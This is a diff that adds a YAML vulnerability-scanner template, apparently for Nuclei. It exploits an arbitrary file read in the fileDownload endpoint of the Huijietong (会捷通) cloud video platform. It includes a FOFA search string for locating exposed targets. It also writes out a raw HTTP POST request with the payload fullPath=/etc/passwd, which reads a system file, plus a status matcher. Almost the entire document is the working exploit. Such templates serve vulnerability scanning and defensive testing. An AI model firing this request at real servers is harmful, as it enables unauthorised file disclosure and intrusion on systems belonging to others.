@@ -1,0 +1,31 @@
+id: poc-yv03idn7oxe5mt7n
+info:
+  name: 会捷通云视讯平台 fileDownload 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yv03idn7oxe5mt7n'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yv03idn7oxe5mt7n
+    fofa: body="/him/api/rest/v1.0/node/role"
+http:
+- raw:
+  - 'POST /fileDownload?action=downloadBackupFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 20
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.57
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Connection: close
+
+    fullPath=/etc/passwd'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
